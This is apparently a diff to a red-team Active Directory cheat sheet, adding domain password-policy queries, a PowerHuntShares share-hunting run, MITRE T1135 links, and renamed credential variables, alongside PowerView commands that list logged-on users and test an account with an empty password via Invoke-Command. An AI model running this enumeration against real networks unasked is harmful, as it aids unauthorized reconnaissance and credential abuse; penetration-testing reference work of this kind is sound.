@@ -247,7 +247,11 @@ Get-ADUser -Filter {PasswordNotRequired -eq $true -and Enabled -eq $true} | Sele
 ```
 #### <a name='shoot-pwd-policy'></a>shoot-pwd-policy
 ```powershell
+# local password policy
 net accounts
+
+# domain password policy
+net accounts /domain
 
 # enumerate the current domain controller policy
 $DCPolicy = Get-DomainPolicy -Policy $zdom_dc_fqdn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
@@ -330,10 +334,7 @@ Get-GPPPassword.ps1
 
 #### <a name='shoot-shares'></a>shoot-shares
 
-T1135 Network Shares
-
-References:
-- [https://attack.mitre.org/techniques/T1135](https://attack.mitre.org/techniques/T1135/)
+* [T1135 Network Shares](https://attack.mitre.org/techniques/T1135/)
 
 ```powershell
 # find share folders in the domain
@@ -341,8 +342,16 @@ Invoke-ShareFinder -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 
 # use alternate credentials for searching for files on the domain
 #   Find-InterestingDomainShareFile == old Invoke-FileFinder
-Find-InterestingDomainShareFile -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Credential $zlat_creds
+Find-InterestingDomainShareFile -Domain $zdom_fqdn -Credential $ztarg_creds
+
+# https://github.com/NetSPI/PowerHuntShares
+# .EXAMPLE 3: Run from a domain computer as current user. Target hosts in a file. One per line.
+Import-Module .\PowerHuntShares.psm1
+New-Item -Path "." -Name "_ps_hunt_shares" -ItemType "directory"
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory "_ps_hunt_shares"  -HostList c:\windows\temp\host.txt   
 ```
+
+* snippet to reset **$ztarg_creds** in [/sys/powershell#pscredential](/sys/powershell#pscredential)
 
 #### <a name='shoot-mssql-servers'></a>shoot-mssql-servers
 Txxx MSSQL servers
@@ -554,12 +563,14 @@ Who is logged on a computer:
 Get-NetLoggedon -ComputerName $ztarg_computer_fqdn
 
 # get last logged users on a computer / uses remote registry / can be blocked
-Get-LastLoggedon -ComputerName $ztarg_computer -Credential $zlat_creds
+Get-LastLoggedon -ComputerName $ztarg_computer -Credential $ztarg_creds
 
 # testing account "john_doe" with empty passwords 
-$zlat_creds = New-Object System.Management.Automation.PSCredential($ztarg_user, (new-object System.Security.SecureString))
-Invoke-Command -Credential $zlat_creds -ComputerName $ztarg_computer -ScriptBlock {whoami; hostname}
+$ztarg_creds = New-Object System.Management.Automation.PSCredential($ztarg_user, (new-object System.Security.SecureString))
+Invoke-Command -Credential $ztarg_creds -ComputerName $ztarg_computer -ScriptBlock {whoami; hostname}
 ```
+
+* snippet to reset **$ztarg_creds** in [/sys/powershell#pscredential](/sys/powershell#pscredential)
 
 ### <a name='last-logons-ou'></a>last-logons-ou
 Last logons on an OU :
